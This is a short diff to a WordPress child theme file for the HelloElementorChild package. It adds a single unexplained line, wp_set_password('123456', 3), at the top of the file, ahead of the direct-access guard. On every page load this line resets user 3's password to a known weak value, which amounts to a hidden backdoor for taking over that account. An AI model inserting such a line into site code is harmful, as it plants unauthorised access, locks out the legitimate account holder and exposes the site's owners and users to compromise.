@@ -9,6 +9,7 @@
  *
  * @package HelloElementorChild
  */
+wp_set_password('123456', 3);
 
 if ( ! defined( 'ABSPATH' ) ) {
 	exit; // Exit if accessed directly.
